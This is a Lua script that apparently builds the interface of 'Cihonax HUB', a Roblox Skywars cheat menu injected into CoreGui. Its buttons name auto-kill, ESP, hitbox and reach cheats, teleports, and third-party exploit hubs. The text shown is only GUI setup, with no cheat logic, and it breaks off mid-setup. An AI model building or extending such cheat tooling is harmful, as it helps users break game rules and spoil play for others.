for i,v in pairs(game.CoreGui:GetDescendants()) do
 if v.Name == "Skywars" then
  v:Destroy()
 end
end
for i,v in pairs(game.CoreGui:GetDescendants()) do
 if v.Name == "Intro" then
  v:Destroy()
 end
end
local a = {
    Skywars = Instance.new("ScreenGui"),
    main = Instance.new("Frame"),
    UICorner = Instance.new("UICorner"),
    hubicon = Instance.new("ImageLabel"),
    specialthings = Instance.new("Frame"),
    UICorner_2 = Instance.new("UICorner"),
    hubname = Instance.new("TextLabel"),
    Close = Instance.new("TextButton"),
    UICorner_3 = Instance.new("UICorner"),
    Exit = Instance.new("TextButton"),
    UICorner_4 = Instance.new("UICorner"),
    tabsframe = Instance.new("Frame"),
    UICorner_5 = Instance.new("UICorner"),
    tabs_container = Instance.new("Frame"),
    UIListLayout = Instance.new("UIListLayout"),
    HomeButton = Instance.new("TextButton"),
    UICorner_6 = Instance.new("UICorner"),
    hometitle = Instance.new("TextLabel"),
    homeicon = Instance.new("ImageLabel"),
    ScriptsButton = Instance.new("TextButton"),
    UICorner_7 = Instance.new("UICorner"),
    scriptstitle = Instance.new("TextLabel"),
    scriptsicon = Instance.new("ImageLabel"),
    FeScriptsButton = Instance.new("TextButton"),
    UICorner_8 = Instance.new("UICorner"),
    fescriptstitle = Instance.new("TextLabel"),
    fescriptsicon = Instance.new("ImageLabel"),
    TeleportsButton = Instance.new("TextButton"),
    UICorner_9 = Instance.new("UICorner"),
    teleportstitle = Instance.new("TextLabel"),
    teleportsicon = Instance.new("ImageLabel"),
    HubsButton = Instance.new("TextButton"),
    UICorner_10 = Instance.new("UICorner"),
    hubtitle = Instance.new("TextLabel"),
    hubsicon = Instance.new("ImageLabel"),
    ProfileButton = Instance.new("TextButton"),
    UICorner_11 = Instance.new("UICorner"),
    profiletitle = Instance.new("TextLabel"),
    profileicon = Instance.new("ImageLabel"),
    MusicPlayerButton = Instance.new("TextButton"),
    UICorner_12 = Instance.new("UICorner"),
    musicplayertitle = Instance.new("TextLabel"),
    musicplayericon = Instance.new("ImageLabel"),
    CreditsButton = Instance.new("TextButton"),
    UICorner_13 = Instance.new("UICorner"),
    creditstitle = Instance.new("TextLabel"),
    creditsicon = Instance.new("ImageLabel"),
    shadow = Instance.new("ImageLabel"),
    UICorner_14 = Instance.new("UICorner"),
    PagesFrame = Instance.new("Frame"),
    CreditsFrame = Instance.new("ScrollingFrame"),
    UIListLayout_2 = Instance.new("UIListLayout"),
    credit = Instance.new("Frame"),
    UICorner_15 = Instance.new("UICorner"),
    info = Instance.new("Frame"),
    UIListLayout_3 = Instance.new("UIListLayout"),
    Title = Instance.new("TextLabel"),
    scripterframe = Instance.new("Frame"),
    UICorner_16 = Instance.new("UICorner"),
    Frame = Instance.new("Frame"),
    UIListLayout_4 = Instance.new("UIListLayout"),
    TextLabel = Instance.new("TextLabel"),
    chopex = Instance.new("TextButton"),
    UICorner_17 = Instance.new("UICorner"),
    yenilmezxxgg = Instance.new("TextButton"),
    UICorner_18 = Instance.new("UICorner"),
    discordlink = Instance.new("TextButton"),
    UICorner_19 = Instance.new("UICorner"),
    UI = Instance.new("Frame"),
    UICorner_23 = Instance.new("UICorner"),
    Frame_3 = Instance.new("Frame"),
    UIListLayout_6 = Instance.new("UIListLayout"),
    TextLabel_3 = Instance.new("TextLabel"),
    uimaker = Instance.new("TextButton"),
    UICorner_24 = Instance.new("UICorner"),
    help = Instance.new("Frame"),
    UICorner_25 = Instance.new("UICorner"),
    Frame_4 = Instance.new("Frame"),
    UIListLayout_7 = Instance.new("UIListLayout"),
    TextLabel_4 = Instance.new("TextLabel"),
    version = Instance.new("TextButton"),
    UICorner_26 = Instance.new("UICorner"),
    createdat = Instance.new("TextButton"),
    UICorner_27 = Instance.new("UICorner"),
    MusicPlayerFrame = Instance.new("ScrollingFrame"),
    UIListLayout_8 = Instance.new("UIListLayout"),
    musop = Instance.new("Frame"),
    UICorner_28 = Instance.new("UICorner"),
    mujoc = Instance.new("Frame"),
    UIListLayout_9 = Instance.new("UIListLayout"),
    Title_2 = Instance.new("TextLabel"),
    musicplay = Instance.new("Frame"),
    UICorner_29 = Instance.new("UICorner"),
    Frame_5 = Instance.new("Frame"),
    UIListLayout_10 = Instance.new("UIListLayout"),
    TextLabel_5 = Instance.new("TextLabel"),
    MusicIDHer = Instance.new("TextBox"),
    Play = Instance.new("TextButton"),
    Stop = Instance.new("TextButton"),
    musocselect = Instance.new("Frame"),
    UICorner_30 = Instance.new("UICorner"),
    Frame_6 = Instance.new("Frame"),
    UIListLayout_11 = Instance.new("UIListLayout"),
    TextLabel_6 = Instance.new("TextLabel"),
    BloodPOP = Instance.new("TextButton"),
    UICorner_31 = Instance.new("UICorner"),
    FashionWeek = Instance.new("TextButton"),
    UICorner_32 = Instance.new("UICorner"),
    MyOrdinaryLife = Instance.new("TextButton"),
    UICorner_33 = Instance.new("UICorner"),
    Rockabye = Instance.new("TextButton"),
    UICorner_34 = Instance.new("UICorner"),
    Temperature = Instance.new("TextButton"),
    UICorner_35 = Instance.new("UICorner"),
    caka9core = Instance.new("TextButton"),
    UICorner_36 = Instance.new("UICorner"),
    cantholdus = Instance.new("TextButton"),
    UICorner_37 = Instance.new("UICorner"),
    deadtome = Instance.new("TextButton"),
    UICorner_38 = Instance.new("UICorner"),
    idfc = Instance.new("TextButton"),
    UICorner_39 = Instance.new("UICorner"),
    shrek = Instance.new("TextButton"),
    UICorner_40 = Instance.new("UICorner"),
    ProfileFrame = Instance.new("ScrollingFrame"),
    UIListLayout_12 = Instance.new("UIListLayout"),
    profitrol = Instance.new("Frame"),
    UICorner_41 = Instance.new("UICorner"),
    profol = Instance.new("Frame"),
    UIListLayout_13 = Instance.new("UIListLayout"),
    Title_3 = Instance.new("TextLabel"),
    urinfo = Instance.new("Frame"),
    UICorner_42 = Instance.new("UICorner"),
    Frame_7 = Instance.new("Frame"),
    UIListLayout_14 = Instance.new("UIListLayout"),
    TextLabel_7 = Instance.new("TextLabel"),
    TextLabel_8 = Instance.new("TextLabel"),
    TextLabel_9 = Instance.new("TextLabel"),
    TextLabel_10 = Instance.new("TextLabel"),
    TextLabel_11 = Instance.new("TextLabel"),
    TextLabel_12 = Instance.new("TextLabel"),
    TextLabel_13 = Instance.new("TextLabel"),
    TextLabel_14 = Instance.new("TextLabel"),
    name = Instance.new("TextLabel"),
    dplayname = Instance.new("TextLabel"),
    plesid = Instance.new("TextLabel"),
    uresid = Instance.new("TextLabel"),
    jobid = Instance.new("TextLabel"),
    ProfilePhoto = Instance.new("ImageLabel"),
    UICorner_43 = Instance.new("UICorner"),
    Rank = Instance.new("TextLabel"),
    HUBSandGUIS = Instance.new("ScrollingFrame"),
    UIListLayout_15 = Instance.new("UIListLayout"),
    hubgiz = Instance.new("Frame"),
    UICorner_44 = Instance.new("UICorner"),
    hubar = Instance.new("Frame"),
    UIListLayout_16 = Instance.new("UIListLayout"),
    Title_4 = Instance.new("TextLabel"),
    hubgil = Instance.new("Frame"),
    UICorner_45 = Instance.new("UICorner"),
    hubar_2 = Instance.new("Frame"),
    UIListLayout_17 = Instance.new("UIListLayout"),
    Title_5 = Instance.new("TextLabel"),
    domainhubx = Instance.new("TextButton"),
    UICorner_46 = Instance.new("UICorner"),
    ezhub = Instance.new("TextButton"),
    UICorner_47 = Instance.new("UICorner"),
    firegui = Instance.new("TextButton"),
    UICorner_48 = Instance.new("UICorner"),
    owlhub = Instance.new("TextButton"),
    UICorner_49 = Instance.new("UICorner"),
    rosehub = Instance.new("TextButton"),
    UICorner_50 = Instance.new("UICorner"),
    topkekv4 = Instance.new("TextButton"),
    UICorner_51 = Instance.new("UICorner"),
    uraniumhub = Instance.new("TextButton"),
    UICorner_52 = Instance.new("UICorner"),
    TeleportsFrame = Instance.new("ScrollingFrame"),
    UIListLayout_18 = Instance.new("UIListLayout"),
    credit_2 = Instance.new("Frame"),
    UICorner_53 = Instance.new("UICorner"),
    info_2 = Instance.new("Frame"),
    UIListLayout_19 = Instance.new("UIListLayout"),
    Title_6 = Instance.new("TextLabel"),
    teleportsfrema = Instance.new("Frame"),
    UICorner_54 = Instance.new("UICorner"),
    Frame_8 = Instance.new("Frame"),
    UIListLayout_20 = Instance.new("UIListLayout"),
    TextLabel_15 = Instance.new("TextLabel"),
    GroupRoom = Instance.new("TextButton"),
    UICorner_55 = Instance.new("UICorner"),
    island1 = Instance.new("TextButton"),
    UICorner_56 = Instance.new("UICorner"),
    island2 = Instance.new("TextButton"),
    UICorner_57 = Instance.new("UICorner"),
    island3 = Instance.new("TextButton"),
    UICorner_58 = Instance.new("UICorner"),
    island4 = Instance.new("TextButton"),
    UICorner_59 = Instance.new("UICorner"),
    island5 = Instance.new("TextButton"),
    UICorner_60 = Instance.new("UICorner"),
    island6 = Instance.new("TextButton"),
    UICorner_61 = Instance.new("UICorner"),
    island7 = Instance.new("TextButton"),
    UICorner_62 = Instance.new("UICorner"),
    island8 = Instance.new("TextButton"),
    UICorner_63 = Instance.new("UICorner"),
    lobby = Instance.new("TextButton"),
    UICorner_64 = Instance.new("UICorner"),
    megavip = Instance.new("TextButton"),
    UICorner_65 = Instance.new("UICorner"),
    middleisland = Instance.new("TextButton"),
    UICorner_66 = Instance.new("UICorner"),
    shop = Instance.new("TextButton"),
    UICorner_67 = Instance.new("UICorner"),
    spwan = Instance.new("TextButton"),
    UICorner_68 = Instance.new("UICorner"),
    vip = Instance.new("TextButton"),
    UICorner_69 = Instance.new("UICorner"),
    GameStore = Instance.new("TextButton"),
    UICorner_70 = Instance.new("UICorner"),
    UICorner_71 = Instance.new("UICorner"),
    FeScriptsFrame = Instance.new("ScrollingFrame"),
    UIListLayout_21 = Instance.new("UIListLayout"),
    efscrku = Instance.new("Frame"),
    UICorner_72 = Instance.new("UICorner"),
    skriper = Instance.new("Frame"),
    UIListLayout_22 = Instance.new("UIListLayout"),
    Title_7 = Instance.new("TextLabel"),
    efscri = Instance.new("Frame"),
    UICorner_73 = Instance.new("UICorner"),
    scriped = Instance.new("Frame"),
    UIListLayout_23 = Instance.new("UIListLayout"),
    Title_8 = Instance.new("TextLabel"),
    blackhole = Instance.new("TextButton"),
    UICorner_74 = Instance.new("UICorner"),
    feadamcagirma = Instance.new("TextButton"),
    UICorner_75 = Instance.new("UICorner"),
    feamogus = Instance.new("TextButton"),
    UICorner_76 = Instance.new("UICorner"),
    fehatsuniverse = Instance.new("TextButton"),
    UICorner_77 = Instance.new("UICorner"),
    fekeyboard = Instance.new("TextButton"),
    UICorner_78 = Instance.new("UICorner"),
    feneptunain = Instance.new("TextButton"),
    UICorner_79 = Instance.new("UICorner"),
    ferussosword = Instance.new("TextButton"),
    UICorner_80 = Instance.new("UICorner"),
    ScriptsFrame = Instance.new("ScrollingFrame"),
    UIListLayout_24 = Instance.new("UIListLayout"),
    scripttext = Instance.new("Frame"),
    UICorner_81 = Instance.new("UICorner"),
    skriper_2 = Instance.new("Frame"),
    UIListLayout_25 = Instance.new("UIListLayout"),
    Title_9 = Instance.new("TextLabel"),
    scripts = Instance.new("Frame"),
    UICorner_82 = Instance.new("UICorner"),
    scriped_2 = Instance.new("Frame"),
    UIListLayout_26 = Instance.new("UIListLayout"),
    Title_10 = Instance.new("TextLabel"),
    autofarm = Instance.new("TextButton"),
    UICorner_83 = Instance.new("UICorner"),
    autofarmsblocks = Instance.new("TextButton"),
    UICorner_84 = Instance.new("UICorner"),
    autokillall = Instance.new("TextButton"),
    UICorner_85 = Instance.new("UICorner"),
    btools = Instance.new("TextButton"),
    UICorner_86 = Instance.new("UICorner"),
    cmdxadmin = Instance.new("TextButton"),
    UICorner_87 = Instance.new("UICorner"),
    ctrltp = Instance.new("TextButton"),
    UICorner_88 = Instance.new("UICorner"),
    esp = Instance.new("TextButton"),
    UICorner_89 = Instance.new("UICorner"),
    espores = Instance.new("TextButton"),
    UICorner_90 = Instance.new("UICorner"),
    flyscript = Instance.new("TextButton"),
    UICorner_91 = Instance.new("UICorner"),
    hitbox = Instance.new("TextButton"),
    UICorner_92 = Instance.new("UICorner"),
    infiniteyield = Instance.new("TextButton"),
    UICorner_93 = Instance.new("UICorner"),
    magicsword = Instance.new("TextButton"),
    UICorner_94 = Instance.new("UICorner"),
    reach = Instance.new("TextButton"),
    UICorner_95 = Instance.new("UICorner"),
    reachgui = Instance.new("TextButton"),
    UICorner_96 = Instance.new("UICorner"),
    revizadmin = Instance.new("TextButton"),
    UICorner_97 = Instance.new("UICorner"),
    shattervastadmin = Instance.new("TextButton"),
    UICorner_98 = Instance.new("UICorner"),
    skyfu = Instance.new("TextButton"),
    UICorner_99 = Instance.new("UICorner"),
    hitboxexpander = Instance.new("TextButton"),
    UICorner_109 = Instance.new("UICorner"),
    HomeFrame = Instance.new("ScrollingFrame"),
    UIListLayout_27 = Instance.new("UIListLayout"),
    homur = Instance.new("Frame"),
    UICorner_100 = Instance.new("UICorner"),
    skriper_3 = Instance.new("Frame"),
    UIListLayout_28 = Instance.new("UIListLayout"),
    Title_11 = Instance.new("TextLabel"),
    hom = Instance.new("Frame"),
    UICorner_101 = Instance.new("UICorner"),
    scriped_3 = Instance.new("Frame"),
    Title_12 = Instance.new("TextLabel"),
    TextLabel_16 = Instance.new("TextLabel"),
    TextLabel_17 = Instance.new("TextLabel"),
    JumpPower = Instance.new("Frame"),
    mdifier = Instance.new("TextButton"),
    FOVValue = Instance.new("TextLabel"),
    SpeedGui = Instance.new("Frame"),
    mdifier_2 = Instance.new("TextButton"),
    FOVValue_2 = Instance.new("TextLabel"),
    Frame_9 = Instance.new("Frame"),
    re = Instance.new("TextButton"),
    UICorner_102 = Instance.new("UICorner"),
    kickyourself = Instance.new("TextButton"),
    UICorner_103 = Instance.new("UICorner"),
    crashurgame = Instance.new("TextButton"),
    UICorner_104 = Instance.new("UICorner"),
    Frame_10 = Instance.new("Frame"),
    circleattack = Instance.new("TextButton"),
    UICorner_105 = Instance.new("UICorner"),
    normalattack = Instance.new("TextButton"),
    UICorner_106 = Instance.new("UICorner"),
    OpenFrame = Instance.new("Frame"),
    UICorner_107 = Instance.new("UICorner"),
    Open = Instance.new("TextButton"),
    UICorner_108 = Instance.new("UICorner"),
    ButtonSound = Instance.new("Sound")
}
a.Skywars.Name = "Skywars"
a.Skywars.Parent = game.CoreGui
a.Skywars.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
a.main.Name = "main"
a.main.Parent = a.Skywars
a.main.Active = true
a.main.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
a.main.Position = UDim2.new(0.49000001, 0, 0.365999997, 0)
a.main.Size = UDim2.new(0, 100, 0, 100)
a.UICorner.CornerRadius = UDim.new(0, 5)
a.UICorner.Parent = a.main
a.hubicon.Name = "hubicon"
a.hubicon.Parent = a.main
a.hubicon.Active = true
a.hubicon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.hubicon.BackgroundTransparency = 1.000
a.hubicon.Position = UDim2.new(-0.000353246927, 0, 0.00608861446, 0)
a.hubicon.Size = UDim2.new(0, 100, 0, 100)
a.hubicon.Image = "http://www.roblox.com/asset/?id=7641965934"
a.hubicon.ImageTransparency = 1.000
a.specialthings.Name = "specialthings"
a.specialthings.Parent = a.main
a.specialthings.Active = true
a.specialthings.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
a.specialthings.Size = UDim2.new(1, 0, 0, 38)
a.specialthings.Visible = false
a.UICorner_2.CornerRadius = UDim.new(0, 4)
a.UICorner_2.Parent = a.specialthings
a.hubname.Name = "hubname"
a.hubname.Parent = a.specialthings
a.hubname.Active = true
a.hubname.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
a.hubname.BackgroundTransparency = 1.000
a.hubname.Position = UDim2.new(0, 12, 0, 6)
a.hubname.Size = UDim2.new(0.418786705, -46, 0.342105269, 16)
a.hubname.Font = Enum.Font.GothamBold
a.hubname.Text = "Cihonax HUB | Skywars"
a.hubname.TextColor3 = Color3.fromRGB(255, 255, 255)
a.hubname.TextSize = 15.000
a.hubname.TextWrapped = true
a.hubname.TextXAlignment = Enum.TextXAlignment.Left
a.Close.Name = "Close"
a.Close.Parent = a.specialthings
a.Close.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
a.Close.Position = UDim2.new(0.899999976, 0, 0, 0)
a.Close.Size = UDim2.new(0, 20, 0, 0)
a.Close.Font = Enum.Font.SourceSans
a.Close.Text = ""
a.Close.TextColor3 = Color3.fromRGB(0, 0, 0)
a.Close.TextSize = 14.000
a.Close.TextTransparency = 1.000
a.Close.Visible = false
a.UICorner_3.CornerRadius = UDim.new(0, 4)
a.UICorner_3.Parent = a.Close
a.Exit.Name = "Exit"
a.Exit.Parent = a.specialthings
a.Exit.BackgroundColor3 = Color3.fromRGB(255, 106, 0)
a.Exit.Position = UDim2.new(0.949999988, 0, 0, 0)
a.Exit.Size = UDim2.new(0, 20, 0, 0)
a.Exit.Font = Enum.Font.SourceSans
a.Exit.Text = ""
a.Exit.TextColor3 = Color3.fromRGB(0, 0, 0)
a.Exit.TextSize = 14.000
a.Exit.TextTransparency = 1.000
a.Exit.Visible = false
a.UICorner_4.CornerRadius = UDim.new(0, 4)
a.UICorner_4.Parent = a.Exit
a.tabsframe.Name = "tabsframe"
a.tabsframe.Parent = a.main
a.tabsframe.Active = true
a.tabsframe.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.tabsframe.Position = UDim2.new(0, 0, 0, 37)
a.tabsframe.Size = UDim2.new(0, 0, 1, -38)
a.tabsframe.Visible = false
a.UICorner_5.CornerRadius = UDim.new(0, 2)
a.UICorner_5.Parent = a.tabsframe
a.tabs_container.Name = "tabs_container"
a.tabs_container.Parent = a.tabsframe
a.tabs_container.Active = true
a.tabs_container.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.tabs_container.BackgroundTransparency = 1.000
a.tabs_container.Size = UDim2.new(-999999999, 126, 1.09743595, -38)
a.tabs_container.Position = UDim2.new(0, 0, 0, 0)
a.tabs_container.Visible = false
a.UIListLayout.Parent = a.tabs_container
a.UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout.Padding = UDim.new(0, 10)
a.HomeButton.Name = "HomeButton"
a.HomeButton.Parent = a.tabs_container
a.HomeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.HomeButton.BackgroundTransparency = 1.000
a.HomeButton.Size = UDim2.new(1, 0, 0, 26)
a.HomeButton.Font = Enum.Font.SourceSans
a.HomeButton.Text = ""
a.HomeButton.TextColor3 = Color3.fromRGB(0, 0, 0)
a.HomeButton.TextSize = 14.000
a.UICorner_6.CornerRadius = UDim.new(0, 2)
a.UICorner_6.Parent = a.HomeButton
a.hometitle.Name = "hometitle"
a.hometitle.Parent = a.HomeButton
a.hometitle.Active = true
a.hometitle.BackgroundTransparency = 1.000
a.hometitle.Position = UDim2.new(0, 40, 0, 0)
a.hometitle.Size = UDim2.new(0, 76, 1, 0)
a.hometitle.Font = Enum.Font.Gotham
a.hometitle.Text = "Home"
a.hometitle.TextColor3 = Color3.fromRGB(163, 162, 165)
a.hometitle.TextSize = 12.000
a.homeicon.Name = "homeicon"
a.homeicon.Parent = a.HomeButton
a.homeicon.Active = true
a.homeicon.BackgroundTransparency = 1.000
a.homeicon.Position = UDim2.new(0, 12, 0, 0)
a.homeicon.Size = UDim2.new(0, 16, 0, 26)
a.homeicon.Image = "http://www.roblox.com/asset/?id=173616340"
a.homeicon.ImageColor3 = Color3.fromRGB(163, 162, 165)
a.homeicon.ScaleType = Enum.ScaleType.Fit
a.ScriptsButton.Name = "ScriptsButton"
a.ScriptsButton.Parent = a.tabs_container
a.ScriptsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.ScriptsButton.BackgroundTransparency = 1.000
a.ScriptsButton.Size = UDim2.new(1, 0, 0, 26)
a.ScriptsButton.Font = Enum.Font.SourceSans
a.ScriptsButton.Text = ""
a.ScriptsButton.TextColor3 = Color3.fromRGB(0, 0, 0)
a.ScriptsButton.TextSize = 14.000
a.UICorner_7.CornerRadius = UDim.new(0, 2)
a.UICorner_7.Parent = a.ScriptsButton
a.scriptstitle.Name = "scriptstitle"
a.scriptstitle.Parent = a.ScriptsButton
a.scriptstitle.Active = true
a.scriptstitle.BackgroundTransparency = 1.000
a.scriptstitle.Position = UDim2.new(0, 40, 0, 0)
a.scriptstitle.Size = UDim2.new(0, 76, 1, 0)
a.scriptstitle.Font = Enum.Font.Gotham
a.scriptstitle.Text = "Scripts"
a.scriptstitle.TextColor3 = Color3.fromRGB(163, 162, 165)
a.scriptstitle.TextSize = 12.000
a.scriptsicon.Name = "scriptsicon"
a.scriptsicon.Parent = a.ScriptsButton
a.scriptsicon.Active = true
a.scriptsicon.BackgroundTransparency = 1.000
a.scriptsicon.Position = UDim2.new(0, 12, 0, 0)
a.scriptsicon.Size = UDim2.new(0, 16, 0, 26)
a.scriptsicon.Image = "http://www.roblox.com/asset/?id=2609397568"
a.scriptsicon.ImageColor3 = Color3.fromRGB(163, 162, 165)
a.scriptsicon.ScaleType = Enum.ScaleType.Fit
a.FeScriptsButton.Name = "FeScriptsButton"
a.FeScriptsButton.Parent = a.tabs_container
a.FeScriptsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.FeScriptsButton.BackgroundTransparency = 1.000
a.FeScriptsButton.Size = UDim2.new(1, 0, 0, 26)
a.FeScriptsButton.Font = Enum.Font.SourceSans
a.FeScriptsButton.Text = ""
a.FeScriptsButton.TextColor3 = Color3.fromRGB(0, 0, 0)
a.FeScriptsButton.TextSize = 14.000
a.UICorner_8.CornerRadius = UDim.new(0, 2)
a.UICorner_8.Parent = a.FeScriptsButton
a.fescriptstitle.Name = "fescriptstitle"
a.fescriptstitle.Parent = a.FeScriptsButton
a.fescriptstitle.Active = true
a.fescriptstitle.BackgroundTransparency = 1.000
a.fescriptstitle.Position = UDim2.new(0, 40, 0, 0)
a.fescriptstitle.Size = UDim2.new(0, 76, 1, 0)
a.fescriptstitle.Font = Enum.Font.Gotham
a.fescriptstitle.Text = "Fe Scripts"
a.fescriptstitle.TextColor3 = Color3.fromRGB(163, 162, 165)
a.fescriptstitle.TextSize = 12.000
a.fescriptsicon.Name = "fescriptsicon"
a.fescriptsicon.Parent = a.FeScriptsButton
a.fescriptsicon.Active = true
a.fescriptsicon.BackgroundTransparency = 1.000
a.fescriptsicon.Position = UDim2.new(0, 12, 0, 0)
a.fescriptsicon.Size = UDim2.new(0, 16, 0, 26)
a.fescriptsicon.Image = "http://www.roblox.com/asset/?id=1376230870"
a.fescriptsicon.ImageColor3 = Color3.fromRGB(163, 162, 165)
a.fescriptsicon.ScaleType = Enum.ScaleType.Fit
a.TeleportsButton.Name = "TeleportsButton"
a.TeleportsButton.Parent = a.tabs_container
a.TeleportsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.TeleportsButton.BackgroundTransparency = 1.000
a.TeleportsButton.Size = UDim2.new(1, 0, 0, 26)
a.TeleportsButton.Font = Enum.Font.SourceSans
a.TeleportsButton.Text = ""
a.TeleportsButton.TextColor3 = Color3.fromRGB(0, 0, 0)
a.TeleportsButton.TextSize = 14.000
a.UICorner_9.CornerRadius = UDim.new(0, 2)
a.UICorner_9.Parent = a.TeleportsButton
a.teleportstitle.Name = "teleportstitle"
a.teleportstitle.Parent = a.TeleportsButton
a.teleportstitle.Active = true
a.teleportstitle.BackgroundTransparency = 1.000
a.teleportstitle.Position = UDim2.new(0, 40, 0, 0)
a.teleportstitle.Size = UDim2.new(0, 76, 1, 0)
a.teleportstitle.Font = Enum.Font.Gotham
a.teleportstitle.Text = "Teleports"
a.teleportstitle.TextColor3 = Color3.fromRGB(163, 162, 165)
a.teleportstitle.TextSize = 12.000
a.teleportsicon.Name = "teleportsicon"
a.teleportsicon.Parent = a.TeleportsButton
a.teleportsicon.Active = true
a.teleportsicon.BackgroundTransparency = 1.000
a.teleportsicon.Position = UDim2.new(0, 12, 0, 0)
a.teleportsicon.Size = UDim2.new(0, 16, 0, 26)
a.teleportsicon.Image = "http://www.roblox.com/asset/?id=8174369604"
a.teleportsicon.ImageColor3 = Color3.fromRGB(163, 162, 165)
a.teleportsicon.ScaleType = Enum.ScaleType.Fit
a.HubsButton.Name = "HubsButton"
a.HubsButton.Parent = a.tabs_container
a.HubsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.HubsButton.BackgroundTransparency = 1.000
a.HubsButton.Size = UDim2.new(1, 0, 0, 26)
a.HubsButton.Font = Enum.Font.SourceSans
a.HubsButton.Text = ""
a.HubsButton.TextColor3 = Color3.fromRGB(0, 0, 0)
a.HubsButton.TextSize = 14.000
a.UICorner_10.CornerRadius = UDim.new(0, 2)
a.UICorner_10.Parent = a.HubsButton
a.hubtitle.Name = "hubtitle"
a.hubtitle.Parent = a.HubsButton
a.hubtitle.Active = true
a.hubtitle.BackgroundTransparency = 1.000
a.hubtitle.Position = UDim2.new(0, 40, 0, 0)
a.hubtitle.Size = UDim2.new(0, 76, 1, 0)
a.hubtitle.Font = Enum.Font.Gotham
a.hubtitle.Text = "Hubs&Guis"
a.hubtitle.TextColor3 = Color3.fromRGB(163, 162, 165)
a.hubtitle.TextSize = 12.000
a.hubsicon.Name = "hubsicon"
a.hubsicon.Parent = a.HubsButton
a.hubsicon.Active = true
a.hubsicon.BackgroundTransparency = 1.000
a.hubsicon.Position = UDim2.new(0, 12, 0, 0)
a.hubsicon.Size = UDim2.new(0, 16, 0, 26)
a.hubsicon.Image = "http://www.roblox.com/asset/?id=5898082771"
a.hubsicon.ImageColor3 = Color3.fromRGB(163, 162, 165)
a.hubsicon.ScaleType = Enum.ScaleType.Fit
a.ProfileButton.Name = "ProfileButton"
a.ProfileButton.Parent = a.tabs_container
a.ProfileButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.ProfileButton.BackgroundTransparency = 1.000
a.ProfileButton.Size = UDim2.new(1, 0, 0, 26)
a.ProfileButton.Font = Enum.Font.SourceSans
a.ProfileButton.Text = ""
a.ProfileButton.TextColor3 = Color3.fromRGB(0, 0, 0)
a.ProfileButton.TextSize = 14.000
a.UICorner_11.CornerRadius = UDim.new(0, 2)
a.UICorner_11.Parent = a.ProfileButton
a.profiletitle.Name = "profiletitle"
a.profiletitle.Parent = a.ProfileButton
a.profiletitle.Active = true
a.profiletitle.BackgroundTransparency = 1.000
a.profiletitle.Position = UDim2.new(0, 40, 0, 0)
a.profiletitle.Size = UDim2.new(0, 76, 1, 0)
a.profiletitle.Font = Enum.Font.Gotham
a.profiletitle.Text = "Profile"
a.profiletitle.TextColor3 = Color3.fromRGB(163, 162, 165)
a.profiletitle.TextSize = 12.000
a.profileicon.Name = "profileicon"
a.profileicon.Parent = a.ProfileButton
a.profileicon.Active = true
a.profileicon.BackgroundTransparency = 1.000
a.profileicon.Position = UDim2.new(0, 12, 0, 0)
a.profileicon.Size = UDim2.new(0, 16, 0, 26)
a.profileicon.Image = "http://www.roblox.com/asset/?id=7962146544"
a.profileicon.ImageColor3 = Color3.fromRGB(163, 162, 165)
a.profileicon.ScaleType = Enum.ScaleType.Fit
a.MusicPlayerButton.Name = "MusicPlayerButton"
a.MusicPlayerButton.Parent = a.tabs_container
a.MusicPlayerButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.MusicPlayerButton.BackgroundTransparency = 1.000
a.MusicPlayerButton.Size = UDim2.new(1, 0, 0, 26)
a.MusicPlayerButton.Font = Enum.Font.SourceSans
a.MusicPlayerButton.Text = ""
a.MusicPlayerButton.TextColor3 = Color3.fromRGB(0, 0, 0)
a.MusicPlayerButton.TextSize = 14.000
a.UICorner_12.CornerRadius = UDim.new(0, 2)
a.UICorner_12.Parent = a.MusicPlayerButton
a.musicplayertitle.Name = "musicplayertitle"
a.musicplayertitle.Parent = a.MusicPlayerButton
a.musicplayertitle.Active = true
a.musicplayertitle.BackgroundTransparency = 1.000
a.musicplayertitle.Position = UDim2.new(0, 40, 0, 0)
a.musicplayertitle.Size = UDim2.new(0, 76, 1, 0)
a.musicplayertitle.Font = Enum.Font.Gotham
a.musicplayertitle.Text = "Music Player"
a.musicplayertitle.TextColor3 = Color3.fromRGB(163, 162, 165)
a.musicplayertitle.TextSize = 12.000
a.musicplayericon.Name = "musicplayericon"
a.musicplayericon.Parent = a.MusicPlayerButton
a.musicplayericon.Active = true
a.musicplayericon.BackgroundTransparency = 1.000
a.musicplayericon.Position = UDim2.new(0, 12, 0, 0)
a.musicplayericon.Size = UDim2.new(0, 16, 0, 26)
a.musicplayericon.Image = "http://www.roblox.com/asset/?id=2965306394"
a.musicplayericon.ImageColor3 = Color3.fromRGB(163, 162, 165)
a.musicplayericon.ScaleType = Enum.ScaleType.Fit
a.CreditsButton.Name = "CreditsButton"
a.CreditsButton.Parent = a.tabs_container
a.CreditsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.CreditsButton.BackgroundTransparency = 1.000
a.CreditsButton.Size = UDim2.new(1, 0, 0, 26)
a.CreditsButton.Font = Enum.Font.SourceSans
a.CreditsButton.Text = ""
a.CreditsButton.TextColor3 = Color3.fromRGB(0, 0, 0)
a.CreditsButton.TextSize = 14.000
a.UICorner_13.CornerRadius = UDim.new(0, 2)
a.UICorner_13.Parent = a.CreditsButton
a.creditstitle.Name = "creditstitle"
a.creditstitle.Parent = a.CreditsButton
a.creditstitle.Active = true
a.creditstitle.BackgroundTransparency = 1.000
a.creditstitle.Position = UDim2.new(0, 40, 0, 0)
a.creditstitle.Size = UDim2.new(0, 76, 1, 0)
a.creditstitle.Font = Enum.Font.Gotham
a.creditstitle.Text = "Credits"
a.creditstitle.TextColor3 = Color3.fromRGB(163, 162, 165)
a.creditstitle.TextSize = 12.000
